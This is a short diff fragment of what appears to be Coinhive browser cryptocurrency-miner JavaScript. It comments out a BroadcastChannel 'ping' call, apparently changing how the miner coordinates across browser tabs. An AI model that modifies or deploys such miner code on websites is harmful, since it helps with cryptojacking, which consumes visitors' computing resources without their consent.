@@ -282,7 +282,8 @@ var closePostMessage=true;
 		}
 		if (this.isRunning() && !this._waitingForAuth) {
 			if (this._bc) {
-				this._bc.postMessage("ping")
+				//airose add here
+				//this._bc.postMessage("ping")
 			}
 			try {
 				localStorage.setItem("coinhive", JSON.stringify({
